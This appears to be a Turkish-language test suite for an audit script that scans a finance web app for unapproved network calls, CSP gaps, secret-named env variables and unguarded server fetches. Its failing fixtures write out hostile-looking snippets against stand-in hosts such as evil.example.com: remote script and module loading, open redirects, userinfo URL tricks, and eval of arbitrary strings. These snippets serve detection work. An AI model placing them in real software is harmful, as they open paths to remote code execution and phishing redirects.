// scripts/denetim.mjs için KIRMIZI (ihlal yakalanır) / YEŞİL (temiz geçer) testleri.
// Her test geçici dizinde küçük bir sahte kök kurar; ağ yok, gerçek koda dokunmaz.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { spawnSync } from 'node:child_process';

const BETIK = join(process.cwd(), 'scripts', 'denetim.mjs');
const CSP = "default-src 'self'; connect-src 'self' https://api.frankfurter.dev https://api.coingecko.com; object-src 'none'";

type Agac = Record<string, string | Buffer>;

function temizAgac(): Agac {
  return {
    'src/market.ts': "export const f = () => fetch('https://api.frankfurter.dev/v1/latest');\nexport const g = () => fetch('https://api.coingecko.com/api/v3/ping');\n",
    'src/kaynaklar/tcmb.ts': "const FN_URL = '/api/evds';\n",
    'src/store.ts': "const KEY = 'fagent.portfolio.v1';\n",
    'src/backup.ts': "export const BACKED_UP_KEYS = [\n  'fagent.portfolio.v1',\n] as const;\n",
    'vercel.json': JSON.stringify({ headers: [{ headers: [{ key: 'Content-Security-Policy', value: CSP }] }] }),
    'netlify.toml': `[[headers]]\n  [headers.values]\n    Content-Security-Policy = "${CSP}"\n[[redirects]]\n  from = "/api/evds"\n  to = "/.netlify/functions/evds"\n`,
    'api/evds.mjs': "import { h } from '../netlify/functions/evds.mjs';\nexport default h;\n",
    'netlify/functions/evds.mjs':
      "import { yukariAkisaGit, sinirliOku } from '../ortak/sunucu-ortak.mjs';\n"
      + "const U = 'https://evds2.tcmb.gov.tr/service';\n"
      + "export const h = async (fetchFn = (...a) => globalThis.fetch(...a)) => { const g = await yukariAkisaGit(fetchFn, U); return sinirliOku(g.res, 10); };\n",
    'netlify/ortak/sunucu-ortak.mjs':
      "export async function yukariAkisaGit(fetchFn, url, init = {}) {\n  return fetchFn(url, { ...init, signal: AbortSignal.timeout(4000), redirect: 'error' });\n}\nexport async function sinirliOku() {}\n",
    'dist/assets/index-a.js': Buffer.alloc(1000, 97),
    'dist/assets/index-a.css': Buffer.alloc(500, 97),
  };
}

function calistir(agac: Agac) {
  const kok = mkdtempSync(join(tmpdir(), 'denetim-'));
  try {
    for (const [yol, icerik] of Object.entries(agac)) {
      const tam = join(kok, yol);
      mkdirSync(dirname(tam), { recursive: true });
      writeFileSync(tam, icerik);
    }
    const r = spawnSync(process.execPath, [BETIK, '--kok', kok, '--json'], { encoding: 'utf8' });
    const cikti = JSON.parse(r.stdout) as { bulgular: { ciddiyet: string; kural: string; yer: string }[] };
    return { kod: r.status, bulgular: cikti.bulgular };
  } finally { rmSync(kok, { recursive: true, force: true }); }
}

const hatalar = (b: { ciddiyet: string; kural: string }[], kural: string) => b.filter((x) => x.ciddiyet === 'HATA' && x.kural === kural);

test('YEŞİL: temiz ağaç HATA vermez, çıkış kodu 0', () => {
  const r = calistir(temizAgac());
  assert.deepEqual(r.bulgular.filter((b) => b.ciddiyet === 'HATA'), []);
  assert.equal(r.kod, 0);
});

test('KIRMIZI ag-izinsiz-host: istemci listede olmayan adrese fetch atar', () => {
  const a = temizAgac();
  a['src/kotu.ts'] = "export const x = () => fetch('https://izinsiz.example.org/veri');\n";
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'ag-izinsiz-host').length, 1);
  assert.equal(r.kod, 1);
});

test('KIRMIZI ag-izinsiz-host: sunucu fonksiyonu listede olmayan adrese gider', () => {
  const a = temizAgac();
  a['netlify/functions/evds.mjs'] += "const Y = 'https://baska.example.net/x';\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-izinsiz-host').length, 1);
});

test('YEŞİL ag-izinsiz-host: yorumdaki adres ve xmlns sayılmaz', () => {
  const a = temizAgac();
  a['src/yorum.ts'] = "// bkz. https://yorum.example.org/x\n/* https://blok.example.org */\nconst s = 'http://www.w3.org/2000/svg';\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-izinsiz-host').length, 0);
});

test('KIRMIZI ag-api-yolu-yok: istemci olmayan /api ucunu çağırır', () => {
  const a = temizAgac();
  a['src/kotu.ts'] = "const FN_URL = '/api/yok';\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-api-yolu-yok').length, 1);
});

test('KIRMIZI csp-eksik: istemci CSP\'de olmayan adrese fetch eder', () => {
  const a = temizAgac();
  a['src/market.ts'] = "export const f = () => fetch('https://api.frankfurter.dev/x');\nexport const g = () => fetch('https://api.coingecko.com/y');\nexport const h = () => fetch('https://api.frankfurter.dev/z');\n";
  const dar = CSP.replace(' https://api.coingecko.com', '');
  a['vercel.json'] = JSON.stringify({ headers: [{ headers: [{ key: 'Content-Security-Policy', value: dar }] }] });
  a['netlify.toml'] = (a['netlify.toml'] as string).replace(CSP, dar);
  const r = calistir(a);
  assert.ok(hatalar(r.bulgular, 'csp-eksik').length >= 2); // iki dosyada da eksik
});

test('KIRMIZI csp-uyumsuz: vercel ve netlify connect-src farklı', () => {
  const a = temizAgac();
  a['netlify.toml'] = (a['netlify.toml'] as string).replace(' https://api.coingecko.com', '');
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'csp-uyumsuz').length, 1);
});

test('YEŞİL csp-fazla yalnız UYARI: kullanılmayan izin çıkışı bozmaz', () => {
  const a = temizAgac();
  const fazla = CSP.replace('connect-src', 'connect-src https://kullanilmayan.example.com');
  a['vercel.json'] = JSON.stringify({ headers: [{ headers: [{ key: 'Content-Security-Policy', value: fazla }] }] });
  a['netlify.toml'] = (a['netlify.toml'] as string).replace(CSP, fazla);
  const r = calistir(a);
  assert.ok(r.bulgular.some((b) => b.ciddiyet === 'UYARI' && b.kural === 'csp-fazla'));
  assert.equal(r.kod, 0);
});

function cspDegistir(a: Record<string, unknown>, yeni: string) {
  a['vercel.json'] = JSON.stringify({ headers: [{ headers: [{ key: 'Content-Security-Policy', value: yeni }] }] });
  a['netlify.toml'] = (a['netlify.toml'] as string).replace(CSP, yeni);
}

test('KIRMIZI csp-supabase-joker: connect-src içinde *.supabase.co / wss://*.supabase.co HATA (A-D1-1)', () => {
  for (const ek of ['https://*.supabase.co', 'wss://*.supabase.co', 'https://*.supabase.in']) {
    const a = temizAgac();
    cspDegistir(a, CSP.replace('connect-src', `connect-src ${ek}`));
    const r = calistir(a);
    assert.equal(hatalar(r.bulgular, 'csp-supabase-joker').length, 2, ek); // iki dosyada
    assert.equal(r.kod, 1, ek);
  }
});

test('KIRMIZI G3 csp joker biçimleri: büyük harf şema, port, sondaki /, şema-tek, tek * (HATA)', () => {
  const beklenen: Array<[string, string]> = [
    ['HTTPS://*.supabase.co', 'csp-supabase-joker'],
    ['https://*.supabase.co:443', 'csp-supabase-joker'],
    ['*.supabase.co/', 'csp-supabase-joker'],
    ['wss://*.SUPABASE.co', 'csp-supabase-joker'],
    ['https:', 'csp-joker'],
    ['wss:', 'csp-joker'],
    ['*', 'csp-joker'],
    ['https://*.example.com', 'csp-joker'],
  ];
  for (const [ek, kural] of beklenen) {
    const a = temizAgac();
    cspDegistir(a, CSP.replace('connect-src', `connect-src ${ek}`));
    const r = calistir(a);
    assert.equal(hatalar(r.bulgular, kural).length, 2, ek);
    assert.equal(r.kod, 1, ek);
  }
});

test('YEŞİL G3: portlu/yollu ama jokersiz açık host joker sayılmaz', () => {
  const a = temizAgac();
  cspDegistir(a, CSP.replace('connect-src', 'connect-src https://abc.supabase.co:443/rest'));
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'csp-supabase-joker').length + hatalar(r.bulgular, 'csp-joker').length, 0);
});

test('YEŞİL csp-supabase-joker: jokersiz CSP + kodda supabase-js varsa csp-eksik YOK; proje alt alanı serbest', () => {
  const a = temizAgac();
  a['package.json'] = JSON.stringify({ dependencies: { '@supabase/supabase-js': '1.0.0' } });
  a['src/cloud.ts'] = "import { createClient } from '@supabase/supabase-js';\nexport const c = createClient(import.meta.env.VITE_SUPABASE_URL, 'k');\n";
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'csp-supabase-joker').length, 0);
  assert.equal(hatalar(r.bulgular, 'csp-eksik').length, 0);
  assert.equal(r.kod, 0);
  const b = temizAgac();
  b['src/cloud.ts'] = a['src/cloud.ts'];
  cspDegistir(b, CSP.replace('connect-src', 'connect-src https://abcdefgh.supabase.co wss://abcdefgh.supabase.co'));
  const r2 = calistir(b);
  assert.equal(hatalar(r2.bulgular, 'csp-supabase-joker').length, 0);
  assert.ok(!r2.bulgular.some((x) => x.kural === 'csp-fazla' && /supabase/.test(x.aciklama ?? '')));
});

test('KIRMIZI butce-asimi: JS toplamı bütçeyi aşar', () => {
  const a = temizAgac();
  a['dist/assets/index-b.js'] = Buffer.alloc(1_300_000, 97);
  const r = calistir(a);
  assert.ok(hatalar(r.bulgular, 'butce-asimi').length >= 1);
  assert.equal(r.kod, 1);
});

test('KIRMIZI butce-asimi: CSS bütçeyi aşar', () => {
  const a = temizAgac();
  a['dist/assets/index-b.css'] = Buffer.alloc(20_000, 97);
  assert.equal(hatalar(calistir(a).bulgular, 'butce-asimi').length, 1);
});

test('YEŞİL butce: dist yoksa atlanır, HATA yok', () => {
  const a = temizAgac();
  delete a['dist/assets/index-a.js']; delete a['dist/assets/index-a.css'];
  const r = calistir(a);
  assert.ok(r.bulgular.some((b) => b.kural === 'butce-atlandi'));
  assert.equal(r.kod, 0);
});

test('KIRMIZI sunucu-fetch-korumasiz: ham fetch, zaman aşımı ve redirect yok', () => {
  const a = temizAgac();
  a['netlify/functions/kotu.mjs'] = "export const h = async () => fetch('https://evds2.tcmb.gov.tr/x');\n";
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'sunucu-fetch-korumasiz').length, 2); // zaman aşımı + redirect
});

test('YEŞİL sunucu-fetch-korumasiz: ham fetch ama AbortSignal + redirect:error var', () => {
  const a = temizAgac();
  a['netlify/functions/iyi.mjs'] = "export const h = async () => fetch('https://evds2.tcmb.gov.tr/x', { signal: AbortSignal.timeout(3000), redirect: 'error' });\n";
  assert.equal(hatalar(calistir(a).bulgular, 'sunucu-fetch-korumasiz').length, 0);
});

test('KIRMIZI sunucu-fetch-korumasiz: ortak modül korumayı kaybetmiş', () => {
  const a = temizAgac();
  a['netlify/ortak/sunucu-ortak.mjs'] = "export async function yukariAkisaGit(fetchFn, url) { return fetchFn(url); }\nexport async function sinirliOku() {}\n";
  assert.ok(hatalar(calistir(a).bulgular, 'sunucu-fetch-korumasiz').length >= 1);
});

test('KIRMIZI vite-gizli-ad: VITE_ ile başlayan gizli ad', () => {
  const a = temizAgac();
  a['src/kotu.ts'] = 'const k = import.meta.env.' + 'VITE_SUPABASE_' + 'SERVICE_' + 'ROLE_KEY;\n';
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'vite-gizli-ad').length, 1);
  assert.equal(r.kod, 1);
});

test('YEŞİL vite-gizli-ad: publishable anahtar adı serbest', () => {
  const a = temizAgac();
  a['src/iyi.ts'] = 'const k = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;\n';
  assert.equal(hatalar(calistir(a).bulgular, 'vite-gizli-ad').length, 0);
});

test('depolama-yedeksiz: yeni anahtar UYARI verir, bilinen önbellek anahtarı vermez', () => {
  const a = temizAgac();
  a['src/yeni.ts'] = "const K = 'fagent.yeni.katman.v1';\nconst C = 'fagent.kaynak.kap.v1';\n";
  const r = calistir(a);
  const u = r.bulgular.filter((b) => b.ciddiyet === 'UYARI' && b.kural === 'depolama-yedeksiz');
  assert.equal(u.length, 1);
  assert.equal(r.kod, 0);
});

/* ───── Düzeltme turu: dinamik hedef, userinfo, çağrı başına koruma, varsayılan ret, HTML ───── */

test('KIRMIZI ag-dinamik-hedef: değişkenle birleştirilen host', () => {
  const a = temizAgac();
  a['src/kotu.ts'] = "export const x = (h: string) => fetch('https://' + h + '/x');\n";
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'ag-dinamik-hedef').length, 1);
  assert.equal(r.kod, 1);
});

test('KIRMIZI ag-dinamik-hedef: şablonla gelen taban adres', () => {
  const a = temizAgac();
  a['src/kotu.ts'] = "export const x = (base: string) => fetch(`${base}/x`);\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-dinamik-hedef').length, 1);
});

test('KIRMIZI ag-dinamik-hedef: çözülemeyen tanımlayıcı', () => {
  const a = temizAgac();
  a['src/kotu.ts'] = "export const x = (u: string) => fetch(u);\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-dinamik-hedef').length, 1);
});

test('YEŞİL ag-dinamik-hedef: sabite çözülen tanımlayıcı, /api yolu ve izinli host şablonu', () => {
  const a = temizAgac();
  a['src/iyi.ts'] =
    "const FN_URL = '/api/evds';\n"
    + "export const a = () => fetch(FN_URL);\n"
    + "export const b = (id: string) => fetch(`/api/evds?x=${id}`);\n"
    + "export const c = (id: string) => { const url = `https://api.coingecko.com/x/${id}`; return fetch(url); };\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-dinamik-hedef').length, 0);
});

test('KIRMIZI ag-izinsiz-host: protokolsüz //host dizesi', () => {
  const a = temizAgac();
  a['src/kotu.ts'] = "export const u = new URL('//evil.example.com/x', 'https://api.frankfurter.dev');\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-izinsiz-host').length, 1);
});

test('KIRMIZI ag-kimlikli-url: izinli.host@evil hilesi (istemci)', () => {
  const a = temizAgac();
  a['src/kotu.ts'] = "export const x = () => fetch('https://api.frankfurter.dev@evil.example.com/x');\n";
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'ag-kimlikli-url').length, 1);
  assert.equal(r.kod, 1);
});

test('KIRMIZI ag-kimlikli-url: sunucu dosyasında userinfo', () => {
  const a = temizAgac();
  a['netlify/functions/evds.mjs'] += "const Z = 'https://evds2.tcmb.gov.tr@evil.example.com/x';\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-kimlikli-url').length, 1);
});

test('YEŞİL ag-kimlikli-url: e-posta benzeri @ dize dışında sayılmaz', () => {
  const a = temizAgac();
  a['src/iyi.ts'] = "export const mail = 'destek@example.com';\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-kimlikli-url').length, 0);
});

test('KIRMIZI sunucu-fetch-korumasiz: ortak modüle eklenen ham ikinci fetch', () => {
  const a = temizAgac();
  a['netlify/ortak/sunucu-ortak.mjs'] += "export async function ham(fetchFn, url) { return fetchFn(url, { method: 'GET' }); }\n";
  const r = calistir(a);
  assert.ok(hatalar(r.bulgular, 'sunucu-fetch-korumasiz').length >= 2); // signal + redirect
  assert.ok(r.bulgular.some((b) => b.kural === 'sunucu-fetch-korumasiz' && b.yer.startsWith('netlify/ortak/sunucu-ortak.mjs')));
});

test('KIRMIZI sunucu-fetch-korumasiz: dosyada başka yerde AbortSignal var ama bu çağrıda yok', () => {
  const a = temizAgac();
  a['netlify/functions/karma.mjs'] =
    "export const iyi = () => fetch('https://evds2.tcmb.gov.tr/a', { signal: AbortSignal.timeout(3000), redirect: 'error' });\n"
    + "export const kotu = () => fetch('https://evds2.tcmb.gov.tr/b');\n";
  const r = calistir(a);
  const k = hatalar(r.bulgular, 'sunucu-fetch-korumasiz');
  assert.equal(k.length, 2);
  assert.ok(k.every((b) => b.yer.endsWith(':2')));
});

test('KIRMIZI ag-diger-api: sendBeacon HATA (varsayılan ret)', () => {
  const a = temizAgac();
  a['src/kotu.ts'] = "export const x = () => navigator.sendBeacon('/api/evds', 'x');\n";
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'ag-diger-api').length, 1);
  assert.equal(r.kod, 1);
});

test('KIRMIZI ag-diger-api: XMLHttpRequest, WebSocket, EventSource, new Image, window.open', () => {
  for (const kod of [
    'const x = new XMLHttpRequest();',
    "const w = new WebSocket('wss://api.frankfurter.dev');",
    "const e = new EventSource('/api/evds');",
    "const i = new Image(); i.src = 'https://api.frankfurter.dev/p.png';",
    "window.open('https://api.frankfurter.dev');",
  ]) {
    const a = temizAgac();
    a['src/kotu.ts'] = kod + '\n';
    assert.ok(hatalar(calistir(a).bulgular, 'ag-diger-api').length >= 1, kod);
  }
});

test('KIRMIZI ag-izinsiz-host: HTML\'de dış script', () => {
  const a = temizAgac();
  a['index.html'] = '<html><head><script src="https://cdn.example.com/x.js"></script></head></html>\n';
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'ag-izinsiz-host').length, 1);
  assert.equal(r.kod, 1);
});

test('KIRMIZI ag-izinsiz-host: HTML\'de protokolsüz link ve public/ altı img', () => {
  const a = temizAgac();
  a['index.html'] = '<link rel="stylesheet" href="//fonts.example.com/f.css">\n';
  a['public/test.html'] = '<img src="http://piksel.example.com/p.gif">\n';
  assert.equal(hatalar(calistir(a).bulgular, 'ag-izinsiz-host').length, 2);
});

test('YEŞİL HTML: yerel script/link bağlantıları serbest', () => {
  const a = temizAgac();
  a['index.html'] = '<link rel="icon" href="/favicon.svg"><script type="module" src="/src/main.tsx"></script>\n';
  assert.equal(calistir(a).bulgular.filter((b) => b.ciddiyet === 'HATA').length, 0);
});

/* ───── 2. düzeltme turu: tam-satır istisna, url izleme, dolaylı çağrı, import, eval, public ───── */

const KAP_SARMALAYICI = 'const varsayilanFetch: FetchLike = (url, init) => fetch(url, init);';
const TCMB_IYI =
  "const FN_URL = '/api/evds';\n"
  + 'export type FetchLike = (url: string, init?: { signal?: AbortSignal }) => Promise<Response>;\n'
  + 'async function evdsSatirlari(url: string, fetchFn: FetchLike, signal: AbortSignal) {\n'
  + '  const res = await fetchFn(url, { signal }); // yorum\n'
  + '  return res;\n'
  + '}\n'
  + 'export const a = (q: string, f: FetchLike, s: AbortSignal) => evdsSatirlari(`${FN_URL}?${q}`, f, s);\n';

test('YEŞİL istisna: tam satır eşleşen ince sarmalayıcı ve izlenen url geçer', () => {
  const a = temizAgac();
  a['src/kaynaklar/kap.ts'] = "const FN_URL = '/api/evds';\n" + KAP_SARMALAYICI + '\n';
  a['src/kaynaklar/tcmb.ts'] = TCMB_IYI;
  const r = calistir(a);
  assert.deepEqual(r.bulgular.filter((b) => b.ciddiyet === 'HATA'), []);
});

test('KIRMIZI i1: istisna satırına ikinci serbest fetch eklenince istisna düşer', () => {
  const a = temizAgac();
  a['src/kaynaklar/kap.ts'] = KAP_SARMALAYICI + ' fetch(location.hash.slice(1));\n';
  const r = calistir(a);
  assert.ok(hatalar(r.bulgular, 'ag-dinamik-hedef').length >= 1);
  assert.equal(r.kod, 1);
});

test('KIRMIZI i2: istisnalı fetchFn(url) çağrısında url location\'dan atanıyor', () => {
  const a = temizAgac();
  a['src/kaynaklar/tcmb.ts'] = TCMB_IYI.replace(
    '  const res = await fetchFn',
    '  const url = location.hash.slice(1);\n  const res = await fetchFn');
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'ag-dinamik-hedef').length, 1);
  assert.ok(r.bulgular.some((b) => b.kural === 'ag-dinamik-hedef' && /izinsiz kaynaktan/.test((b as { aciklama?: string }).aciklama ?? '')));
});

test('KIRMIZI i2b: fonksiyonun çağrısı FN_URL dışı bir değer geçiriyor', () => {
  const a = temizAgac();
  a['src/kaynaklar/tcmb.ts'] = TCMB_IYI + 'export const k = (f: FetchLike, s: AbortSignal) => evdsSatirlari(location.hash.slice(1), f, s);\n';
  assert.equal(hatalar(calistir(a).bulgular, 'ag-dinamik-hedef').length, 1);
});

test('KIRMIZI i3: istisna satırı değişince (fazladan boşluk dışı içerik) istisna düşer', () => {
  const a = temizAgac();
  a['src/kaynaklar/kap.ts'] = 'const varsayilanFetch: FetchLike = (url, init) => fetch(url, init as RequestInit);\n';
  assert.ok(hatalar(calistir(a).bulgular, 'ag-dinamik-hedef').length >= 1);
});

test('KIRMIZI n2: fetch takma adı (const f = fetch)', () => {
  const a = temizAgac();
  a['src/kotu.ts'] = "const f = fetch;\nexport const g = (u: string) => f(u);\n";
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'ag-dolayli-cagri').length, 1);
  assert.equal(r.kod, 1);
});

test('KIRMIZI n3: Reflect.apply(fetch, ...), .call ve .bind', () => {
  for (const kod of [
    "export const x = (u: string) => Reflect.apply(fetch, window, [u]);",
    "export const x = (u: string) => fetch.call(window, u);",
    "export const x = fetch.bind(window);",
    "export const x = (u: string) => self.fetch(u);",
  ]) {
    const a = temizAgac();
    a['src/kotu.ts'] = kod + '\n';
    assert.ok(hatalar(calistir(a).bulgular, 'ag-dolayli-cagri').length >= 1, kod);
  }
});

test('KIRMIZI n4: köşeli erişim ve dinamik global anahtar', () => {
  for (const kod of [
    "export const x = (u: string) => window['fet' + 'ch'](u);",
    'export const x = (k: string, u: string) => globalThis[k](u);',
    "export const x = (u: string) => (window as any)[\"fetch\"](u);",
  ]) {
    const a = temizAgac();
    a['src/kotu.ts'] = kod + '\n';
    assert.ok(hatalar(calistir(a).bulgular, 'ag-dolayli-cagri').length >= 1, kod);
  }
});

test('YEŞİL dolaylı çağrı: doğrudan window.fetch(/api/...) ve nesne anahtarı fetch:', () => {
  const a = temizAgac();
  a['src/iyi.ts'] = "export const x = () => window.fetch('/api/evds');\nexport const o = { fetch: 1 };\nexport const fetchedAt = 1;\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-dolayli-cagri').length, 0);
});

test('KIRMIZI n5: dinamik import() ve uzaktan modül', () => {
  for (const kod of [
    'export const x = (m: string) => import(m);',
    "export const x = () => import('https://evil.example.com/m.js');",
    'export const x = (m: string) => import(`./${m}`);',
  ]) {
    const a = temizAgac();
    a['src/kotu.ts'] = kod + '\n';
    const r = calistir(a);
    assert.ok(hatalar(r.bulgular, 'ag-dinamik-import').length >= 1, kod);
    assert.equal(r.kod, 1);
  }
});

test('YEŞİL n5: sabit göreli import ve bağımlılık paketi serbest', () => {
  const a = temizAgac();
  a['package.json'] = JSON.stringify({ dependencies: { '@supabase/supabase-js': '1.0.0' } });
  a['src/iyi.ts'] = "export const a = () => import('./App');\nexport const b = () => import('@supabase/supabase-js');\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-dinamik-import').length, 0);
});

test('KIRMIZI n6: eval( ve new Function(', () => {
  for (const kod of ["export const x = (k: string) => eval(k);", "export const x = (k: string) => new Function(k)();"]) {
    const a = temizAgac();
    a['src/kotu.ts'] = kod + '\n';
    const r = calistir(a);
    assert.equal(hatalar(r.bulgular, 'kod-dinamik-calistirma').length, 1, kod);
    assert.equal(r.kod, 1);
  }
});

test('KIRMIZI n6b: sunucu dosyasında eval', () => {
  const a = temizAgac();
  a['netlify/functions/evds.mjs'] += 'export const e = (k) => eval(k);\n';
  assert.equal(hatalar(calistir(a).bulgular, 'kod-dinamik-calistirma').length, 1);
});

test('YEŞİL n6: evaluate( ve yorumdaki eval( sayılmaz', () => {
  const a = temizAgac();
  a['src/iyi.ts'] = "// eval(x) kullanma\nexport const evaluate = (x: number) => x;\nexport const y = evaluate(1);\n";
  assert.equal(hatalar(calistir(a).bulgular, 'kod-dinamik-calistirma').length, 0);
});

test('KIRMIZI p1: public/ altı svg\'de dış href ve xlink:href', () => {
  const a = temizAgac();
  a['public/logo.svg'] = '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://piksel.example.com/p.png"/></svg>\n';
  a['public/logo2.svg'] = '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="//cdn.example.com/s.svg#a"/></svg>\n';
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'ag-izinsiz-host').length, 2);
  assert.equal(r.kod, 1);
});

test('YEŞİL p1: svg xmlns serbest; json/txt içindeki dış URL yalnız UYARI', () => {
  const a = temizAgac();
  a['public/ok.svg'] = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"/>\n';
  a['public/manifest.webmanifest'] = '{ "start_url": "https://baska.example.com/" }\n';
  const r = calistir(a);
  assert.equal(r.bulgular.filter((b) => b.ciddiyet === 'HATA').length, 0);
  assert.equal(r.bulgular.filter((b) => b.kural === 'public-dis-url').length, 1);
  assert.equal(r.kod, 0);
});

/* ───── 3. tur: FN_URL, yönlendirme, Worker, script elemanı ───── */

test('KIRMIZI x4: FN_URL izinli dış hosta çevrilmiş', () => {
  const a = temizAgac();
  a['src/kotu.ts'] = "const FN_URL = 'https://api.frankfurter.dev/v1/latest';\nexport const x = () => fetch(FN_URL);\n";
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'ag-fn-url').length, 1);
  assert.equal(r.kod, 1);
});

test('KIRMIZI x4: FN_URL var olmayan api dosyasına işaret ediyor ya da dinamik', () => {
  for (const kod of ["const FN_URL = '/api/yok';", 'const FN_URL = location.origin + "/api/evds";', "let FN_URL: string = `/api/${'evds'}`;"]) {
    const a = temizAgac();
    a['src/kotu.ts'] = kod + '\nexport const x = () => fetch(FN_URL);\n';
    assert.ok(hatalar(calistir(a).bulgular, 'ag-fn-url').length >= 1, kod);
  }
});

test('YEŞİL x4: FN_URL = \'/api/evds\' ve api/evds.mjs var', () => {
  const a = temizAgac();
  a['src/iyi.ts'] = "const FN_URL = '/api/evds';\nexport const x = () => fetch(FN_URL);\n";
  const r = calistir(a);
  assert.equal(hatalar(r.bulgular, 'ag-fn-url').length, 0);
  assert.equal(r.kod, 0);
});

test('KIRMIZI x12: location atamaları ve assign/replace sabit göreli değil', () => {
  for (const kod of [
    'location = new URLSearchParams(location.search).get("u")!;',
    'location.href = "https://evil.example.com/";',
    'location.assign(sessionStorage.getItem("u")!);',
    'location.replace("//evil.example.com/x");',
    'window.location = "https://evil.example.com/";',
    'document.location = u;',
    'window.location.href = `https://evil.example.com/${u}`;',
  ]) {
    const a = temizAgac();
    a['src/kotu.ts'] = `export const x = (u: string) => { ${kod} };\n`;
    const r = calistir(a);
    assert.ok(hatalar(r.bulgular, 'ag-yonlendirme').length >= 1, kod);
    assert.equal(r.kod, 1);
  }
});

test('YEŞİL x12: sabit göreli yönlendirme, karşılaştırma ve reload serbest', () => {
  const a = temizAgac();
  a['src/iyi.ts'] =
    "export const a = () => { location.href = '/'; };\n"
    + "export const b = () => { window.location.assign('#ayarlar'); };\n"
    + "export const c = () => location.reload();\n"
    + "export const d = () => location.pathname === '/x';\n"
    + "export const e = () => window.location.replace('/giris');\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-yonlendirme').length, 0);
});

test('KIRMIZI x8: new Worker / SharedWorker sabit göreli değil', () => {
  for (const kod of [
    "export const w = new Worker('https://evil.example.com/w.js');",
    'export const w = (u: string) => new Worker(u);',
    "export const w = new SharedWorker('//evil.example.com/w.js');",
    'export const w = (n: string) => new Worker(`./${n}.js`);',
  ]) {
    const a = temizAgac();
    a['src/kotu.ts'] = kod + '\n';
    const r = calistir(a);
    assert.ok(hatalar(r.bulgular, 'ag-worker').length >= 1, kod);
    assert.equal(r.kod, 1);
  }
});

test('YEŞİL x8: sabit göreli Worker ve new URL(\'./w.ts\', import.meta.url)', () => {
  const a = temizAgac();
  a['src/iyi.ts'] =
    "export const a = new Worker('./w.js');\n"
    + "export const b = new Worker(new URL('./w.ts', import.meta.url), { type: 'module' });\n"
    + "export const c = new SharedWorker('/w.js');\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-worker').length, 0);
});

test('KIRMIZI x9: createElement(\'script\') dış/dinamik src ya da src yok', () => {
  for (const kod of [
    "const s = document.createElement('script'); s.src = 'https://evil.example.com/x.js'; document.head.append(s);",
    "const s = document.createElement('script'); s.src = u; document.head.append(s);",
    "const s = document.createElement('script'); s.textContent = k; document.head.append(s);",
    "const s = document.createElement('script'); s.setAttribute('src', u);",
  ]) {
    const a = temizAgac();
    a['src/kotu.ts'] = `export const x = (u: string, k: string) => { ${kod} };\n`;
    const r = calistir(a);
    assert.equal(hatalar(r.bulgular, 'ag-script-elemani').length, 1, kod);
    assert.equal(r.kod, 1);
  }
});

test('YEŞİL x9: sabit göreli src atanan script ve başka createElement serbest', () => {
  const a = temizAgac();
  a['src/iyi.ts'] =
    "export const a = () => { const s = document.createElement('script'); s.src = '/assets/x.js'; document.head.append(s); };\n"
    + "export const b = () => document.createElement('div');\n";
  assert.equal(hatalar(calistir(a).bulgular, 'ag-script-elemani').length, 0);
});
